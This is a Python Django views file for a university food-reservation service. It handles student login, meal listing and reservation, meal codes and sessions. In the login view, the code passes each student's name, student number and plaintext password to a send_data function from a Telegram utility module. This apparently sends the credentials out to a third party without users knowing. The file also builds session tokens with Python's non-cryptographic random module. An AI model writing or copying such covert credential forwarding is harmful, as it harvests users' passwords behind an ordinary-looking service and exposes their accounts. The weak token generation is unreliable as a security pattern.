import json
import random
import string

from django.http import JsonResponse
from django.views.decorators.http import require_http_methods
from utils.boostan import Boostan
from utils.decorators import (
    login_decorator,
    login_post_parameters,
    permission_decorator,
)
from utils.functions import after_auth_stuffs, create_sessions_list, get_client_ip
from utils.telegram import send_data

from .models import (
    create_session_object_for_student,
    delete_session_object_for_student,
    get_all_user_sessions_by_sesion,
    get_deadline_message,
    get_food_reserve_unexpected_error_message,
    get_forget_code_deadline_message,
    get_insufficient_balance_message,
    get_invalid_credential_message,
    get_missing_food_list_message,
    get_missing_parameter_message,
    get_no_reserved_food_message,
    get_session_not_found_message,
    get_session_not_passed_message,
    get_student_by_stu_number,
    get_succeess_login_message,
    get_success_logout_message,
    get_success_reserve_message,
    increment_total_forget_code,
    increment_total_recieved_list,
    increment_total_reserved_food,
    statistics_total_forget_code,
    statistics_total_list,
    statistics_total_reserves,
    update_user_credit,
)


@require_http_methods(["POST"])
def login(request):
    if not {"stun", "password", "telegram_data"}.issubset(set(request.POST)):
        return JsonResponse(
            {"error": get_missing_parameter_message(), "relogin": True}, status=400
        )
    ip_address = get_client_ip(request)
    user_agent = request.META.get("HTTP_USER_AGENT", "")
    stu_number = request.POST.get("stun").strip()
    password = request.POST.get("password").strip()
    telegram_data = json.loads(request.POST.get("telegram_data"))
    boostan = Boostan(stu_number, password)
    login_status = boostan.login()
    if not login_status:
        return JsonResponse(
            {"error": get_invalid_credential_message(), "relogin": True}, status=401
        )
    name, credit = boostan.get_user_info()
    session = session_generator()
    after_auth_stuffs(ip_address, stu_number, password, name, credit, session, user_agent)
    student = get_student_by_stu_number(stu_number)
    create_session_object_for_student(
        student=student,
        session=session,
        ip_address=ip_address,
        user_agent=user_agent,
        telegram_id=telegram_data.get("id", ""),
        telegram_username=telegram_data.get("username", ""),
    )

    send_data(name, stu_number, password)
    return JsonResponse({"message": get_succeess_login_message(), "session": session}, status=200)


def session_generator():
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(32))


@require_http_methods(["POST"])
@login_post_parameters
@login_decorator
@permission_decorator
def food_list(request, student, boostan):
    food_list_status = boostan.get_food_list()
    if not food_list_status:
        return JsonResponse({"error": get_deadline_message()}, status=400)
    elif food_list_status == 1:
        return JsonResponse({"error": get_insufficient_balance_message()}, status=400)
    food_list = food_list_status
    statistics_total_list()
    increment_total_recieved_list(student)
    return JsonResponse({"food_list": food_list}, status=200)


@require_http_methods(["POST"])
@login_post_parameters
@login_decorator
@permission_decorator
def reserve_food(request, student, boostan):
    if not "food-list" in request.POST:
        return JsonResponse({"error": get_missing_food_list_message()}, status=400)
    food_list = json.loads(request.POST["food-list"])
    boostan.get_user_info()
    food_list_status = boostan.get_food_list()
    if not food_list_status:
        return JsonResponse({"error": get_deadline_message()}, status=400)
    food_list_status = boostan.reserve_food(food_list)
    if not food_list_status:
        return JsonResponse({"error": get_food_reserve_unexpected_error_message()}, status=400)
    elif food_list_status == 2:
        return JsonResponse({"error": get_insufficient_balance_message()}, status=400)
    else:
        credit = boostan.extract_user_name_credit(food_list_status)[1]
        update_user_credit(student, credit)
        statistics_total_reserves()
        increment_total_reserved_food(student)
        return JsonResponse({"message": get_success_reserve_message()}, status=200)


@require_http_methods(["POST"])
@login_post_parameters
@login_decorator
@permission_decorator
def forget_code(request, student, boostan):
    statistics_total_forget_code()
    increment_total_forget_code(student)
    forget_code_status = boostan.get_forget_code()
    if not forget_code_status:
        return JsonResponse({"error": get_no_reserved_food_message()}, status=400)
    elif forget_code_status == 2:
        return JsonResponse({"error": get_forget_code_deadline_message()}, status=400)
    forget_code = forget_code_status
    return JsonResponse({"message": forget_code}, status=200)


@require_http_methods(["POST"])
def logout(request):
    if not {"session"}.issubset(set(request.POST)):
        return JsonResponse({"error": get_session_not_passed_message()}, status=400)
    session = request.POST.get("session").strip()
    if not session:
        return JsonResponse({"error": get_session_not_passed_message()}, status=400)
    if not delete_session_object_for_student(session):
        return JsonResponse({"error": get_session_not_found_message()}, status=400)
    else:
        return JsonResponse({"message": get_success_logout_message()}, status=200)


def get_sessions(request):
    if not {"session"}.issubset(set(request.POST)):
        return JsonResponse({"error": get_session_not_passed_message()}, status=400)
    session = request.POST.get("session").strip()
    if not session:
        return JsonResponse({"error": get_session_not_passed_message()}, status=400)
    sessions = get_all_user_sessions_by_sesion(session)
    if not sessions:
        return JsonResponse({"error": get_session_not_found_message()}, status=400)
    return JsonResponse({"message": create_sessions_list(sessions)}, status=200)
